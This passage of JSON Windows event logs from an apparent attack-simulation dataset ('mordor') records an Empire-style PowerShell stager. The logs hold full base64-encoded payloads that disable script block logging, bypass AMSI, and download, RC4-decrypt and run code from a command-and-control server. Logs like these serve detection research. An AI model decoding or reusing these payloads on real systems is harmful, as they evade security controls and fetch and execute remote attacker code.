HQAaQBPAE4AYQBSAFkAWwBzAFQAUgBpAG4ARwAsAFMAeQBTAFQARQBNAC4ATwBCAEoAZQBDAFQAXQBdADoAOgBOAEUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAQwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAQQBsAH0ARQBsAHMAZQB7AFsAUwBDAFIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AGUAKAAkAG4AdQBMAEwALAAoAE4AZQB3AC0ATwBiAGoAZQBDAFQAIABDAE8ATABMAEUAYwBUAGkAbwBuAFMALgBHAEUAbgBlAHIASQBDAC4ASABhAHMASABTAGUAVABbAFMAVAByAGkAbgBHAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAEYAXQAuAEEAcwBTAEUATQBiAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBsAGwALAAkAFQAUgB1AEUAKQA7AH0AOwBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBTAEUAUgBWAGkAQwBlAFAATwBJAE4AdABNAGEATgBBAEcAZQBSAF0AOgA6AEUAeABwAGUAYwB0ADEAMAAwAEMATwBOAFQASQBOAFUARQA9ADAAOwAkAEEAOQA0ADgANgA9AE4ARQBXAC0ATwBCAGoAZQBjAHQAIABTAHkAcwBUAGUAbQAuAE4ARQBUAC4AVwBFAGIAQwBMAGkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AQwBPAGQASQBuAEcAXQA6ADoAVQBOAEkAYwBvAGQAZQAuAEcAZQB0AFMAVAByAGkAbgBnACgAWwBDAG8ATgBWAEUAUgB0AF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AHIASQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABhADkANAA4ADYALgBIAGUAQQBkAEUAUgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABBADkANAA4ADYALgBQAHIAbwBYAFkAPQBbAFMAWQBTAFQARQBNAC4ATgBFAFQALgBXAEUAYgBSAEUAUQB1AEUAcwBUAF0AOgA6AEQARQBmAGEAdQBsAHQAVwBFAGIAUAByAG8AWABZADsAJABhADkANAA4ADYALgBQAHIATwBYAHkALgBDAHIARQBEAEUAbgBUAEkAYQBsAFMAIAA9ACAAWwBTAFkAUwBUAGUAbQAuAE4AZQBUAC4AQwBSAGUARABFAE4AdABJAGEAbABDAGEAQwBoAEUAXQA6ADoARABFAGYAYQBVAEwAdABOAEUAVABXAG8AUgBrAEMAcgBlAEQAZQBuAHQASQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQARQBNAC4AVABFAHgAVAAuAEUAbgBDAG8ARABJAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAVABFAFMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AG4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGEAOQA0ADgANgAuAEgAZQBBAGQAZQByAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AE8AdgBQAHYAYgB5AG0AZAAwAGIAVgBnAE0AUABxADQAZQA4AGIANABVAEcAMwBXAEsAbQBNAD0AIgApADsAJABkAEEAVABBAD0AJABBADkANAA4ADYALgBEAG8AdwBuAEwATwBBAGQARABBAFQAYQAoACQAcwBFAFIAKwAkAHQAKQA7ACQASQBWAD0AJABkAGEAdABhAFsAMAAuAC4AMwBdADsAJABEAEEAVABhAD0AJABEAEEAVABBAFsANAAuAC4AJABkAGEAVABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBPAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","EventTypeOrignal":"INFO","UtcTime":"2020-07-22 04:19:04.103","@timestamp":"2020-07-22T04:19:05.132Z","Details":"SQBmACgAJABQAFMAVgBlAHIAcwBpAE8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAFIAcwBpAE8ATgAuAE0AYQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJAA1ADcAQQBmADAAPQBbAFIARQBmAF0ALgBBAHMAcwBlAG0AQgBsAFkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANQA3AGEARgAwACkAewAkADQAOABBAGMANgA9ACQANQA3AGEAZgAwAC4ARwBlAFQAVgBhAGwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkADQAOABhAEMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABFAEMAVABJAE8AbgBTAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAHQAaQBPAE4AYQBSAFkAWwBzAFQAUgBpAG4ARwAsAFMAeQBTAFQARQBNAC4ATwBCAEoAZQBDAFQAXQBdADoAOgBOAEUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAQwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAQQBsAH0ARQBsAHMAZQB7AFsAUwBDAFIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AGUAKAAkAG4AdQBMAEwALAAoAE4AZQB3AC0ATwBiAGoAZQBDAFQAIABDAE8ATABMAEUAYwBUAGkAbwBuAFMALgBHAEUAbgBlAHIASQBDAC4ASABhAHMASABTAGUAVABbAFMAVAByAGkAbgBHAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAEYAXQAuAEEAcwBTAEUATQBiAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBsAGwALAAkAFQAUgB1AEUAKQA7AH0AOwBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBTAEUAUgBWAGkAQwBlAFAATwBJAE4AdABNAGEATgBBAEcAZQBSAF0AOgA6AEUAeABwAGUAYwB0ADEAMAAwAEMATwBOAFQASQBOAFUARQA9ADAAOwAkAEEAOQA0ADgANgA9AE4ARQBXAC0ATwBCAGoAZQBjAHQAIABTAHkAcwBUAGUAbQAuAE4ARQBUAC4AVwBFAGIAQwBMAGkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AQwBPAGQASQBuAEcAXQA6ADoAVQBOAEkAYwBvAGQAZQAuAEcAZQB0AFMAVAByAGkAbgBnACgAWwBDAG8ATgBWAEUAUgB0AF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AHIASQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABhADkANAA4ADYALgBIAGUAQQBkAEUAUgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABBADkANAA4ADYALgBQAHIAbwBYAFkAPQBbAFMAWQBTAFQARQBNAC4ATgBFAFQALgBXAEUAYgBSAEUAUQB1AEUAcwBUAF0AOgA6AEQARQBmAGEAdQBsAHQAVwBFAGIAUAByAG8AWABZADsAJABhADkANAA4ADYALgBQAHIATwBYAHkALgBDAHIARQBEAEUAbgBUAEkAYQBsAFMAIAA9ACAAWwBTAFkAUwBUAGUAbQAuAE4AZQBUAC4AQwBSAGUARABFAE4AdABJAGEAbABDAGEAQwBoAEUAXQA6ADoARABFAGYAYQBVAEwAdABOAEUAVABXAG8AUgBrAEMAcgBlAEQAZQBuAHQASQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQARQBNAC4AVABFAHgAVAAuAEUAbgBDAG8ARABJAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAVABFAFMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AG4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGEAOQA0ADgANgAuAEgAZQBBAGQAZQByAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AE8AdgBQAHYAYgB5AG0AZAAwAGIAVgBnAE0AUABxADQAZQA4AGIANABVAEcAMwBXAEsAbQBNAD0AIgApADsAJABkAEEAVABBAD0AJABBADkANAA4ADYALgBEAG8AdwBuAEwATwBBAGQARABBAFQAYQAoACQAcwBFAFIAKwAkAHQAKQA7ACQASQBWAD0AJABkAGEAdABhAFsAMAAuAC4AMwBdADsAJABEAEEAVABhAD0AJABEAEEAVABBAFsANAAuAC4AJABkAGEAVABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBPAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":9368,"OpcodeValue":0,"EventType":"SetValue","EventTime":"2020-07-22 00:19:04","Severity":"INFO","EventID":13,"ThreadID":6244,"RecordNumber":1782145}
{"Task":106,"EventReceivedTime":"2020-07-22 00:19:05","Opcode":"To be used when operation is just executing a method","port":55069,"SeverityValue":2,"ActivityID":"{17E565D6-3A73-0000-54BD-DC81FF5DD601}","Keywords":0,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","@version":"1","SourceModuleType":"im_msvistalog","Version":1,"Payload":"CommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n","tags":["mordorDataset"],"Domain":"MORDOR","SourceName":"Microsoft-Windows-PowerShell","UserID":"S-1-5-21-2253742117-2054739524-205962475-1104","Channel":"Microsoft-Windows-PowerShell/Operational","SourceModuleName":"eventlog","Message":"CommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11331\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc 